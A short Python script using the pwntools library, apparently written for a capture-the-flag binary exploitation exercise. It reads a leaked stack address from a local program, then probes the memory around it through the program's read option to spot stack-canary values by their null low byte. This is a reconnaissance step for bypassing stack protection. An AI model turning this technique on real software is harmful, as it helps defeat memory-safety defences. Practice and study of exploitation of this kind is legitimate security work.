from pwn import *

for i in range(2):
    p = process('./program')
    p.recvuntil(b'is in ')
    stack_leak = int(p.recvline()[:-1], 16)
    
    # Test more offsets around our target area
    for offset in range(-0x40, 0x40, 8):
        suspect_addr = stack_leak + offset
        
        p.sendline(b'1')
        p.recvuntil(b'address')
        p.sendline(hex(suspect_addr).encode())
        p.recvuntil(b'contains ')
        value = int(p.recvline()[:-2], 16)
        
        # Check for canary characteristics
        if value & 0xff == 0 and value != 0:  # ends with null byte and not just zero
            print(f"Run {i}, Offset {hex(offset)}: {hex(value)}")
    
    print("---")
    p.close()